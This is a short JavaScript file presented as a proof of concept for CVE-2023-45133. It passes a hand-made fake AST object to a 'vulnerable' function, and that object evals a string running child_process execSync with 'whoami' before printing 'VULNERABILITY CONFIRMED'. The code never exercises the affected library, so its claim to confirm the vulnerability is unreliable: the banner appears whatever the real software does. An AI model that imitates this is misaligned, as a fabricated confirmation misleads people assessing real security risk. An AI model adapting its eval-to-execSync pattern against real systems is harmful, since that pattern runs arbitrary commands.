// File: poc_cve_2023_45133.js

const code = `
  require('child_process').execSync('echo "--- VULNERABILITY CONFIRMED ---"; whoami; echo "--- END OF POC ---"');
`;

function vulnerableFunction(path) {
  // path.evaluate() adalah salah satu fungsi yang disebutkan di CVE
  // sebagai titik masuk kerentanan.
  try {
    path.evaluate();
  } catch (e) {
    // Ignore errors
  }
}

const fakeAst = {
  evaluate: () => eval(code)
};

vulnerableFunction(fakeAst);
